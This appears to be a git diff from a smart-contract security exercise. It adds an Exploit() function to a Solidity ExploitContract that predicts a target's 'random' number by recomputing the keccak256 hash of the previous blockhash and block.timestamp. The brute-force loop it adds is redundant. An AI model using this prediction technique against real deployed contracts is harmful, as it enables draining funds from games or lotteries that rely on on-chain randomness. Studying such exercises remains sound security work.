@@ -28,6 +28,13 @@ contract ExploitContract {
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
-        return answer;
+        /// @dev this is the less optimal way: brute forcing all the uint8 values until we get the correct answer
+        /// @dev best way is to use the blockhash and block.timestamp to get the correct answer
+        for (uint8 i = 0; i < type(uint8).max; i++) {
+            if (uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) == i) {
+                return i;
+            }
+        }
+        return type(uint8).max;
     }
 }
